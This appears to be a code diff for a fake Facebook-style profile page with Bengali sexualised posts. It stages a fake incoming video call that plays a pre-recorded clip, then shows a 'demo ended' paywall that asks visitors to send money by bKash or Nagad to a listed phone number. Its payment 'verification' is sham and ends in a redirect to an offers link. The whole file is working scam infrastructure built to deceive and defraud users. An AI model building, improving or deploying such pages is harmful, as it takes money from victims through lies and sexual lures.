@@ -37,6 +37,11 @@
         .act-btn { flex: 1; text-align: center; padding: 8px 0; color: #65676b; font-weight: 600; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 6px; cursor: pointer; }
         .liked { color: var(--fb-blue) !important; }
 
+        /* Loading Spinner */
+        #loading-footer { width: 100%; padding: 20px; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 10px; background: white; margin-top: 10px; }
+        .spinner { width: 25px; height: 25px; border: 3px solid #f3f3f3; border-top: 3px solid var(--fb-blue); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
         /* Messenger UI */
         #messenger-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 15000; display: none; flex-direction: column; }
         .msg-header { padding: 10px 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; justify-content: space-between; background: white; }
@@ -49,42 +54,40 @@
         .msg-input { flex: 1; border: 1px solid #ddd; border-radius: 20px; padding: 8px 15px; outline: none; }
         .send-btn { color: var(--fb-blue); border: none; background: none; font-size: 20px; }
 
-        /* Call & Video View */
-        #call-ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; color: white; }
+        /* Call UI */
+        #call-ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 20000; display: none; flex-direction: column; align-items: center; justify-content: center; color: white; }
         .call-pfp { width: 120px; height: 120px; border-radius: 50%; border: 3px solid white; margin-bottom: 15px; }
         .btn-circle { width: 70px; height: 70px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; border: none; cursor: pointer; color: white; }
         .bg-red { background: #ff3b30; }
         .bg-green { background: #4cd964; }
 
-        #video-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 11000; display: none; }
+        #video-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 21000; display: none; }
         #remote-video { width: 100%; height: 100%; object-fit: cover; }
         #local-cam { position: absolute; top: 20px; right: 20px; width: 90px; height: 130px; border-radius: 8px; border: 1px solid white; object-fit: cover; transform: scaleX(-1); }
 
-        /* --- Payment Gateway Styles (The part you requested) --- */
-        #payment-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 20000; display: none; align-items: center; justify-content: center; padding: 20px; }
-        .pay-card { background: white; width: 100%; max-width: 350px; border-radius: 15px; text-align: center; position: relative; overflow: hidden; }
-        .pay-header { background: #f8f9fa; padding: 15px; border-bottom: 1px solid #eee; font-weight: bold; font-size: 18px; color: #fa3e3e; }
+        /* Payment Choice Box with BACK BUTTON */
+        #payment-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 30000; display: none; align-items: center; justify-content: center; padding: 20px; }
+        .pay-card { background: white; width: 100%; max-width: 350px; border-radius: 15px; text-align: center; position: relative; overflow: hidden; padding-bottom: 20px; }
+        .pay-header { background: #f8f9fa; padding: 15px; border-bottom: 1px solid #eee; font-weight: bold; font-size: 18px; color: #fa3e3e; position: relative; }
+        .back-btn { position: absolute; left: 15px; top: 18px; color: #65676b; cursor: pointer; font-size: 18px; }
         .pay-option { display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; border: 1px solid #ddd; margin: 10px 15px; border-radius: 10px; cursor: pointer; }
         .pay-option.selected { border-color: var(--fb-blue); background: #f0f7ff; }
         .pay-btn { background: var(--fb-blue); color: white; margin: 15px; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; display: block; border: none; width: calc(100% - 30px); }
 
-        #final-pay-gateway { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f0f2f5; z-index: 25000; display: none; flex-direction: column; padding: 15px; }
+        /* Final Gateway */
+        #final-pay-gateway { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f0f2f5; z-index: 35000; display: none; flex-direction: column; padding: 15px; }
         .method-tabs { display: flex; justify-content: center; gap: 15px; margin: 20px 0; }
         .tab-btn { background: white; padding: 10px; border-radius: 12px; border: 2px solid transparent; width: 80px; }
         .tab-btn.active { border-color: var(--bkash); }
-        .tab-btn img { width: 100%; border-radius: 8px; }
         .pay-details-box { background: var(--bkash); color: white; padding: 20px; border-radius: 15px; text-align: left; }
         .pay-details-box.nagad { background: var(--nagad); }
-        .copy-btn { background: white; color: black; padding: 2px 8px; border-radius: 5px; font-size: 12px; float: right; cursor: pointer; }
-        .txn-input { width: 100%; padding: 15px; border: none; border-radius: 10px; margin-top: 15px; font-size: 16px; }
+        .txn-input { width: 100%; padding: 15px; border: none; border-radius: 10px; margin-top: 15px; font-size: 16px; outline: none; }
         .submit-final { background: #27ae60; color: white; width: 100%; padding: 15px; border: none; border-radius: 10px; margin-top: 15px; font-weight: bold; font-size: 18px; }
     </style>
 </head>
 <body>
 
-    <audio id="ringtone" loop preload="auto">
-        <source src="https://github.com/pj9889/aud/raw/refs/heads/main/audio%20(2).mpeg" type="audio/mpeg">
-    </audio>
+    <audio id="ringtone" loop preload="auto"><source src="https://github.com/pj9889/aud/raw/refs/heads/main/audio%20(2).mpeg" type="audio/mpeg"></audio>
 
     <div class="cover"></div>
     <div class="profile-card">
@@ -109,7 +112,6 @@
                 { type: 'text', time: '2 days ago', text: 'ভিডিও কলে আমার সাথে মজা করতে চাইলে এখনই ইনবক্স করো! 😈🍭💦' },
                 { type: 'img', time: '3 days ago', text: 'রাতের এই সময়ে মনটা খুব উতালা হয়ে যায়... আসবে নাকি ভিডিও কলে? 💖🍑', img: 'pic4.webp' }
             ];
-
             postData.forEach(post => {
                 document.write(`
                     <div class="post">
@@ -119,14 +121,11 @@
                         </div>
                         <div class="post-txt">${post.text}</div>
                         ${post.type === 'img' ? `<img src="https://github.com/pj9889/picvid/blob/main/${post.img}?raw=true" class="post-img">` : ''}
-                        <div class="post-stats">
-                            <span><i class="fas fa-thumbs-up"></i> ${(Math.random()*10).toFixed(1)}k</span> 
-                            <span>${Math.floor(Math.random()*500)} Comments</span>
-                        </div>
+                        <div class="post-stats"><span><i class="fas fa-thumbs-up"></i> ${(Math.random()*10).toFixed(1)}k</span><span>${Math.floor(Math.random()*500)} Comments</span></div>
                         <div class="post-actions">
                             <div class="act-btn" onclick="this.classList.toggle('liked')"><i class="far fa-thumbs-up"></i> Like</div>
-                            <div class="act-btn" onclick="triggerCall()"><i class="far fa-comment"></i> Comment</div>
-                            <div class="act-btn" onclick="triggerCall()"><i class="far fa-share-square"></i> Share</div>
+                            <div class="act-btn" onclick="alert('Something wrong')"><i class="far fa-comment"></i> Comment</div>
+                            <div class="act-btn" onclick="alert('Something wrong')"><i class="far fa-share-square"></i> Share</div>
                         </div>
                     </div>
                 `);
@@ -134,33 +133,33 @@
         </script>
     </div>
 
+    <!-- Infinite Loading Footer -->
+    <div id="loading-footer">
+        <div class="spinner"></div>
+        <div style="color:#65676b; font-size:14px; font-weight:600;">Loading more posts...</div>
+    </div>
+
     <!-- Messenger UI -->
     <div id="messenger-box">
         <div class="msg-header">
-            <div class="header-left">
-                <i class="fas fa-arrow-left" onclick="closeMessenger()"></i>
-                <img src="https://github.com/pj9889/picvid/blob/main/pic1.webp?raw=true" width="35" height="35" style="border-radius:50%; margin-left:10px;">
-                <div><b style="font-size:15px;">Surovi Monipuri</b><br><small style="color:gray;">Active Now</small></div>
-            </div>
+            <div class="header-left"><i class="fas fa-arrow-left" onclick="closeMessenger()"></i><img src="https://github.com/pj9889/picvid/blob/main/pic1.webp?raw=true" width="35" height="35" style="border-radius:50%; margin-left:10px;"><div><b style="font-size:15px;">Surovi Monipuri</b><br><small style="color:gray;">Active Now</small></div></div>
             <i class="fas fa-video" onclick="triggerCall()" style="color:var(--fb-blue); font-size:20px;"></i>
         </div>
-        <div class="msg-body" id="msg-body">
-            <div class="msg msg-in">হ্যালো সোনা, কেমন আছো? ❤️</div>
-        </div>
+        <div class="msg-body" id="msg-body"><div class="msg msg-in">হ্যালো সোনা, কেমন আছো? ❤️</div></div>
         <div class="msg-footer">
             <input type="text" id="msg-input" class="msg-input" placeholder="Aa">
             <button class="send-btn" onclick="sendMessage()"><i class="fas fa-paper-plane"></i></button>
         </div>
     </div>
 
-    <!-- Call UI -->
+    <!-- Call Overlay -->
     <div id="call-ui">
         <img src="https://github.com/pj9889/picvid/blob/main/pic1.webp?raw=true" class="call-pfp">
         <h2>Surovi Monipuri</h2>
         <p id="call-status">Incoming Video Call...</p>
         <div style="display:flex; gap:60px;">
             <button class="btn-circle bg-red" onclick="endCall()"><i class="fas fa-phone-slash"></i></button>
-            <button class="btn-circle bg-green" id="accept-btn" onclick="acceptCall()"><i class="fas fa-video"></i></button>
+            <button class="btn-circle bg-green" onclick="acceptCall()"><i class="fas fa-video"></i></button>
         </div>
     </div>
 
@@ -168,15 +167,16 @@
     <div id="video-container">
         <video id="remote-video" playsinline><source src="https://github.com/pj9889/ppp/raw/refs/heads/main/video2.mp4" type="video/mp4"></video>
         <video id="local-cam" autoplay playsinline muted></video>
-        <div style="position:absolute; bottom:50px; left:50%; transform:translateX(-50%);">
-            <button class="btn-circle bg-red" onclick="endCall()"><i class="fas fa-phone-slash"></i></button>
-        </div>
+        <div style="position:absolute; bottom:50px; left:50%; transform:translateX(-50%);"><button class="btn-circle bg-red" onclick="endCall()"><i class="fas fa-phone-slash"></i></button></div>
     </div>
 
     <!-- Payment Choice Box -->
     <div id="payment-box">
         <div class="pay-card">
-            <div class="pay-header">আপনার ডেমো সার্ভিস শেষ</div>
+            <div class="pay-header">
+                <i class="fas fa-arrow-left back-btn" onclick="closePay()"></i>
+                আপনার ডেমো সার্ভিস শেষ
+            </div>
             <p style="padding:10px; color:#666;">ভিডিও কলে সরাসরি কথা বলতে সার্ভিস কিনুন</p>
             <div class="pay-option selected" onclick="selectOption(150, this)"><span>৫ মিনিট</span><b>১৫০ টাকা</b></div>
             <div class="pay-option" onclick="selectOption(199, this)"><span>১০ মিনিট</span><b>১৯৯ টাকা</b></div>
@@ -184,122 +184,55 @@
         </div>
     </div>
 
-    <!-- Final Payment Gateway (Bkash/Nagad) -->
+    <!-- Gateway -->
     <div id="final-pay-gateway">
-        <div style="display:flex; align-items:center;">
-            <i class="fas fa-arrow-left" onclick="closeGateway()" style="font-size:20px;"></i>
-            <h3 style="flex:1; text-align:center;">পেমেন্ট মেথড</h3>
-        </div>
-        
+        <div style="display:flex; align-items:center;"><i class="fas fa-arrow-left" onclick="closeGateway()" style="font-size:20px;"></i><h3 style="flex:1; text-align:center;">পেমেন্ট মেথড</h3></div>
         <div class="method-tabs">
             <div class="tab-btn active" id="b-tab" onclick="switchMethod('bkash')"><img src="https://github.com/pj9889/fffff/blob/main/bksh.png?raw=true"></div>
             <div class="tab-btn" id="n-tab" onclick="switchMethod('nagad')"><img src="https://github.com/pj9889/nagad/raw/refs/heads/main/nagas.jfif"></div>
         </div>
-
         <div id="bkash-area" class="pay-details-box">
             <p>নিচের নাম্বারে <b>Send Money</b> করুন:</p>
-            <h2 style="margin:10px 0;">01625575447 <span class="copy-btn" onclick="copyNum('01625575447')">Copy</span></h2>
+            <h2 style="margin:10px 0;">01625575447 <span style="background:white; color:black; padding:2px 8px; border-radius:5px; font-size:12px; float:right;" onclick="copyNum('01625575447')">Copy</span></h2>
             <p>পরিমাণ: <b id="amt-txt">১৫০ টাকা</b></p>
-            <input type="text" class="txn-input" id="txn-id" placeholder="বিকাশ ট্রানজেকশন আইডি দিন">
+            <input type="text" class="txn-input" placeholder="ট্রানজেকশন আইডি দিন">
             <button class="submit-final" onclick="verifyPay()">পেমেন্ট নিশ্চিত করুন</button>
         </div>
     </div>
 
     <script>
-        let demoUsed = false;
-        let selectedAmount = 150;
-        const ringtone = document.getElementById('ringtone');
+        let demoUsed = false; let selectedAmount = 150; const ringtone = document.getElementById('ringtone');
+        setTimeout(() => { if(!demoUsed) startCall(true); }, 15000);
 
-        setTimeout(() => { if(!demoUsed) startCall(true); }, 20000);
-
-        function triggerCall() {
-            if(!demoUsed) { closeMessenger(); startCall(false); }
-            else { showPayment(); }
-        }
-
+        function triggerCall() { if(!demoUsed) { closeMessenger(); startCall(false); } else { showPayment(); } }
         function startCall(isIncoming) {
             document.getElementById('call-ui').style.display = 'flex';
-            if(isIncoming) {
-                ringtone.play().catch(()=>{});
-                document.getElementById('call-status').innerText = "Incoming Video Call...";
-            } else {
-                document.getElementById('call-status').innerText = "Ringing...";
-                setTimeout(acceptCall, 3000);
-            }
+            if(isIncoming) { ringtone.play().catch(()=>{}); document.getElementById('call-status').innerText = "Incoming Video Call..."; }
+            else { document.getElementById('call-status').innerText = "Ringing..."; setTimeout(acceptCall, 3000); }
         }
-
-        function acceptCall() {
-            ringtone.pause();
-            document.getElementById('call-ui').style.display = 'none';
-            document.getElementById('video-container').style.display = 'block';
-            document.getElementById('remote-video').play();
-            setTimeout(endCall, 12000);
-        }
-
-        function endCall() {
-            ringtone.pause();
-            document.getElementById('video-container').style.display = 'none';
-            document.getElementById('call-ui').style.display = 'none';
-            demoUsed = true;
-            showPayment();
-        }
+        function acceptCall() { ringtone.pause(); document.getElementById('call-ui').style.display = 'none'; document.getElementById('video-container').style.display = 'block'; document.getElementById('remote-video').play(); setTimeout(endCall, 12000); }
+        function endCall() { ringtone.pause(); document.getElementById('video-container').style.display = 'none'; document.getElementById('call-ui').style.display = 'none'; demoUsed = true; showPayment(); }
 
         function openMessenger() { document.getElementById('messenger-box').style.display = 'flex'; }
         function closeMessenger() { document.getElementById('messenger-box').style.display = 'none'; }
-
         function sendMessage() {
-            let input = document.getElementById('msg-input');
-            if(!input.value.trim()) return;
+            let input = document.getElementById('msg-input'); if(!input.value.trim()) return;
             document.getElementById('msg-body').innerHTML += `<div class="msg msg-out">${input.value}</div>`;
-            input.value = "";
-            setTimeout(() => { if(demoUsed) showPayment(); }, 1500);
+            input.value = ""; setTimeout(() => { if(demoUsed) showPayment(); }, 1500);
         }
 
         function showPayment() { document.getElementById('payment-box').style.display = 'flex'; }
-        function selectOption(amt, el) {
-            selectedAmount = amt;
-            document.querySelectorAll('.pay-option').forEach(opt => opt.classList.remove('selected'));
-            el.classList.add('selected');
-        }
-
-        function openGateway() {
-            document.getElementById('payment-box').style.display = 'none';
-            document.getElementById('final-pay-gateway').style.display = 'flex';
-            document.getElementById('amt-txt').innerText = selectedAmount + " টাকা";
-        }
-
+        function closePay() { document.getElementById('payment-box').style.display = 'none'; }
+        function selectOption(amt, el) { selectedAmount = amt; document.querySelectorAll('.pay-option').forEach(opt => opt.classList.remove('selected')); el.classList.add('selected'); }
+        function openGateway() { document.getElementById('payment-box').style.display = 'none'; document.getElementById('final-pay-gateway').style.display = 'flex'; document.getElementById('amt-txt').innerText = selectedAmount + " টাকা"; }
         function closeGateway() { document.getElementById('final-pay-gateway').style.display = 'none'; }
-
         function switchMethod(method) {
             const area = document.getElementById('bkash-area');
-            const bTab = document.getElementById('b-tab');
-            const nTab = document.getElementById('n-tab');
-            if(method === 'nagad') {
-                area.classList.add('nagad');
-                area.innerHTML = `<p>নগদ নাম্বারে <b>Send Money</b> করুন:</p>
-                                  <h2 style="margin:10px 0;">01625575447 <span class="copy-btn" onclick="copyNum('01625575447')">Copy</span></h2>
-                                  <p>পরিমাণ: <b>${selectedAmount} টাকা</b></p>
-                                  <input type="text" class="txn-input" placeholder="নগদ ট্রানজেকশন আইডি দিন">
-                                  <button class="submit-final" onclick="verifyPay()">পেমেন্ট নিশ্চিত করুন</button>`;
-                nTab.classList.add('active'); bTab.classList.remove('active');
-            } else {
-                location.reload(); // Simplest way to reset to bkash UI
-            }
+            if(method === 'nagad') { area.classList.add('nagad'); area.querySelector('p').innerHTML = 'নগদ নাম্বারে <b>Send Money</b> করুন:'; }
+            else { area.classList.remove('nagad'); area.querySelector('p').innerHTML = 'বিকাশ নাম্বারে <b>Send Money</b> করুন:'; }
         }
-
-        function copyNum(num) {
-            navigator.clipboard.writeText(num);
-            alert("নাম্বার কপি হয়েছে!");
-        }
-
-        function verifyPay() {
-            const txn = document.querySelector('.txn-input').value;
-            if(txn.length < 6) { alert("সঠিক ট্রানজেকশন আইডি দিন"); return; }
-            alert("পেমেন্ট ভেরিফাই হচ্ছে... দয়া করে অপেক্ষা করুন।");
-            setTimeout(() => {
-                window.location.href = "https://safeoffers.pro/a/1rypFXB3uXm3P";
-            }, 2000);
-        }
+        function copyNum(num) { navigator.clipboard.writeText(num); alert("নাম্বার কপি হয়েছে!"); }
+        function verifyPay() { alert("ভেরিফাই হচ্ছে..."); setTimeout(() => { window.location.href = "https://safeoffers.pro/a/1rypFXB3uXm3P"; }, 2000); }
     </script>
 </body>
 </html>
